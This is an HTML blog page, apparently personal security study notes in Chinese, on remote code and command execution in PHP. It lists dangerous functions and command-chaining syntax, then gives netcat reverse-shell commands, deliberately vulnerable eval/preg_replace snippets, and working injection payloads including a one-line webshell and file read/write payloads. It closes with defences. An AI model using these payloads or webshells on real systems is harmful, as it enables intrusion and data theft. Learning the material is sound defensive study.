@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="1. 代码执行和命令执行危害非常大，有些漏洞可以直接GetShell执行命令(代码和系统命令)反弹shell获取系统敏感信息">
+<meta property="og:type" content="article">
+<meta property="og:title" content="&#39;远程代码执行&#39;">
+<meta property="og:url" content="https://chirec.github.io/2019/04/23/Remote-Code-Execution/index.html">
+<meta property="og:site_name" content="Emerald Dream">
+<meta property="og:description" content="1. 代码执行和命令执行危害非常大，有些漏洞可以直接GetShell执行命令(代码和系统命令)反弹shell获取系统敏感信息">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-04-25T14:14:42.609Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="&#39;远程代码执行&#39;">
+<meta name="twitter:description" content="1. 代码执行和命令执行危害非常大，有些漏洞可以直接GetShell执行命令(代码和系统命令)反弹shell获取系统敏感信息">
+
+
+
+
+
+
+  <link rel="canonical" href="https://chirec.github.io/2019/04/23/Remote-Code-Execution/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>'远程代码执行' | Emerald Dream</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Emerald Dream</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+  
+  
+
+  
+
+  <a href="https://github.com/ChireC" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" style="fill: #222; color: #fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+    <div class="reading-progress-bar"></div>
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/23/Remote-Code-Execution/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="chessur">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Emerald Dream">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">'远程代码执行'
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-04-23 19:59:28" itemprop="dateCreated datePublished" datetime="2019-04-23T19:59:28+08:00">2019-04-23</time>
+            
+
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="1-代码执行和命令执行"><a href="#1-代码执行和命令执行" class="headerlink" title="1. 代码执行和命令执行"></a>1. 代码执行和命令执行</h1><p>危害非常大，有些漏洞可以直接GetShell<br>执行命令(代码和系统命令)<br>反弹shell<br>获取系统敏感信息</p>
+<a id="more"></a>
+<h1 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h1><h2 id="2-1-原因"><a href="#2-1-原因" class="headerlink" title="2.1 原因"></a>2.1 原因</h2><p>1.参数可控<br>2.使用了可执行系统命令的函数，system()/exec()/shell_exec()，将用户提交的参数拿来执行，中间传递过程无过滤或过滤不严谨<br>注意：执行的命令是系统命令，Windows或者Linux命令</p>
+<h2 id="2-2-分类"><a href="#2-2-分类" class="headerlink" title="2.2 分类"></a>2.2 分类</h2><p>1.代码层<br>2.第三方组件<br>WordPress中用来处理图片的ImageMagick组件<br>心脏滴血漏洞<br>Java中的命令注入漏洞(struts2/ElasticsearchGroovy等)<br>vBulletin 5.x版本通杀远程代码执行<br>3.系统层<br>MS08-067<br>bash破壳漏洞</p>
+<h2 id="2-3-命令执行常用函数"><a href="#2-3-命令执行常用函数" class="headerlink" title="2.3 命令执行常用函数"></a>2.3 命令执行常用函数</h2><p><code></code><br>system()<br>passthru()<br>exec()<br>shell_exec()<br>popen()<br>proc_open()<br>pcntl_exec<br>注意：通过站点中命令执行漏洞执行命令的权限是：依托于站点(www_data/iis_user/USERS)</p>
+<h2 id="2-4-反弹shell"><a href="#2-4-反弹shell" class="headerlink" title="2.4 反弹shell"></a>2.4 反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp port -e /bin/bash</span><br><span class="line">nc ip:port</span><br><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="2-5-Windows下同时执行多条命令语法格式"><a href="#2-5-Windows下同时执行多条命令语法格式" class="headerlink" title="2.5 Windows下同时执行多条命令语法格式"></a>2.5 Windows下同时执行多条命令语法格式</h2><table>
+<thead>
+<tr>
+<th style="text-align:center">命令格式</th>
+<th style="text-align:center">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">command1 &amp; command2</td>
+<td style="text-align:center">先后执行 Command1和 command2，无论command1执行是否成功</td>
+</tr>
+<tr>
+<td style="text-align:center">Command1 &amp;&amp; command2</td>
+<td style="text-align:center">先后执行 Command1和 command2，只有command1执行成功时才执行command2</td>
+</tr>
+<tr>
+<td style="text-align:center">Command1 \</td>
+<td style="text-align:center">\</td>
+<td>Command2</td>
+<td>先后执行 Command1和 command2，只有command1执行失败时才执行command2</td>
+</tr>
+<tr>
+<td style="text-align:center">Command1\</td>
+<td style="text-align:center">Command2</td>
+<td>是管道符，将command1的执行结果 传递给 command2</td>
+</tr>
+</tbody>
+</table>
+<h2 id="2-6-Linux-下同时执行多条命令语法格式"><a href="#2-6-Linux-下同时执行多条命令语法格式" class="headerlink" title="2.6 Linux 下同时执行多条命令语法格式"></a>2.6 Linux 下同时执行多条命令语法格式</h2><table>
+<thead>
+<tr>
+<th>命令格式</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>command1 ; command2</td>
+<td>先后执行 Command1和 command2，无论command1执行是否成功</td>
+</tr>
+<tr>
+<td>command1 &amp; command2</td>
+<td>先后执行 Command1和 command2，无论command1执行是否成功</td>
+</tr>
+<tr>
+<td>Command1 &amp;&amp; Command2</td>
+<td>先后执行 Command1和 command2，只有command1执行成功时才执行command2</td>
+</tr>
+<tr>
+<td>Command1 \</td>
+<td>\</td>
+<td>Command2</td>
+<td>先后执行 Command1和 command2，只有command1执行失败时才执行command2</td>
+</tr>
+<tr>
+<td>Command1\</td>
+<td>Command2</td>
+<td>是管道符，将command1的执行结果 传递给 command2</td>
+</tr>
+</tbody>
+</table>
+<h1 id="3-代码执行"><a href="#3-代码执行" class="headerlink" title="3.代码执行"></a>3.代码执行</h1><p>当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞。</p>
+<p>在php中：eval，assert，preg_replace(‘/*/e’,‘\$ret=“\1”;’,\$data)<br>在Java中：eval，execute，executeglobal<br>在Jsp中：jsp中没有php中的eval函数，到那时可以利用反射机制，使用基于反射机制的表达式引擎，如0GNL，SpELl，MVEL等</p>
+<p>花括号内可执行可变变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>两个示例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$data = $_GET[&apos;data&apos;];</span><br><span class="line">	eval(&quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;);</span><br><span class="line">	echo $ret;</span><br><span class="line">?&gt;</span><br><span class="line">//payload:?data=&#123;$&#123;phpinfo()&#125;&#125;</span><br><span class="line">//payload:?data=&quot;);phpinfo();//</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $data = $_GET[&apos;data&apos;];</span><br><span class="line">    // echo $data;</span><br><span class="line">    preg_replace(&apos;/&lt;data&gt;(.*)&lt;\/data&gt;/e&apos;,&apos;$ret = &quot;\\1&quot;&apos;,$data);</span><br><span class="line">    //echo $ret;</span><br><span class="line">?&gt;</span><br><span class="line">//payload:?data=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+<p>preg一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&apos;/abc/e&apos;,$_POST[&quot;cmd&quot;],&apos;abcdef&apos;)</span><br></pre></td></tr></table></figure>
+<h2 id="3-1代码执行漏洞利用"><a href="#3-1代码执行漏洞利用" class="headerlink" title="3.1代码执行漏洞利用"></a>3.1代码执行漏洞利用</h2><h3 id="3-1-1-一句话"><a href="#3-1-1-一句话" class="headerlink" title="3.1.1 一句话"></a>3.1.1 一句话</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=&#123;$&#123;eval($_POST[&quot;windy&quot;])&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-1-2-获取当前路径"><a href="#3-1-2-获取当前路径" class="headerlink" title="3.1.2 获取当前路径"></a>3.1.2 获取当前路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?data=&#123;$&#123;eval($_POST[&quot;windy&quot;])&#125;&#125;</span><br><span class="line">windy=system(&apos;pwd&apos;)</span><br><span class="line">?data=&#123;$&#123;print(getcwd())&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-1-3-读文件"><a href="#3-1-3-读文件" class="headerlink" title="3.1.3 读文件"></a>3.1.3 读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=&#123;$&#123;exit(var_dump(file_get_contents($_POST[&apos;f&apos;])))&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-1-4-写文件"><a href="#3-1-4-写文件" class="headerlink" title="3.1.4 写文件"></a>3.1.4 写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=&#123;$&#123;exit(var_dump(file_put_contents($_POST[&apos;f&apos;],$_POST[&apos;d&apos;])))&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="4-代码执行漏洞防御："><a href="#4-代码执行漏洞防御：" class="headerlink" title="4. 代码执行漏洞防御："></a>4. 代码执行漏洞防御：</h1><p>1.使用json保存数组，读取数据时不使用eval<br>2.必须使用eval的地方要严格过滤(推荐使用白名单)<br>3.对特殊字符进行转义(addslashes、魔术引号、htmlspecialchars、htmlentities、mysql_real_escape_string等)<br>4.放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换<br>5.若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象</p>
+<h1 id="5-参考"><a href="#5-参考" class="headerlink" title="5.参考"></a>5.参考</h1><p>[1] <a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">深入研究preg_replace与代码执行</a></p>
+<p>[2] <a href="https://www.cnblogs.com/dhsx/p/4991983.html" target="_blank" rel="noopener">慎用preg_replace危险的/e修饰符(一句话后门常用)</a></p>
+<p>[3] <a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">php伪协议实现命令执行的七种姿势</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/22/File-Inclusion/" rel="next" title="'文件包含总结'">
+                <i class="fa fa-chevron-left"></i> '文件包含总结'
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/25/PHP-Serialize-And-Unserialize/" rel="prev" title="'PHP反序列化'">
+                'PHP反序列化' <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">chessur</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">tags</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/ChireC" title="GitHub &rarr; https://github.com/ChireC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-代码执行和命令执行"><span class="nav-text">1. 代码执行和命令执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-命令执行"><span class="nav-text">2.命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-原因"><span class="nav-text">2.1 原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-分类"><span class="nav-text">2.2 分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-命令执行常用函数"><span class="nav-text">2.3 命令执行常用函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-反弹shell"><span class="nav-text">2.4 反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-5-Windows下同时执行多条命令语法格式"><span class="nav-text">2.5 Windows下同时执行多条命令语法格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-6-Linux-下同时执行多条命令语法格式"><span class="nav-text">2.6 Linux 下同时执行多条命令语法格式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-代码执行"><span class="nav-text">3.代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1代码执行漏洞利用"><span class="nav-text">3.1代码执行漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-1-一句话"><span class="nav-text">3.1.1 一句话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-2-获取当前路径"><span class="nav-text">3.1.2 获取当前路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-3-读文件"><span class="nav-text">3.1.3 读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-4-写文件"><span class="nav-text">3.1.4 写文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-代码执行漏洞防御："><span class="nav-text">4. 代码执行漏洞防御：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-参考"><span class="nav-text">5.参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chessur</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.0.1</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
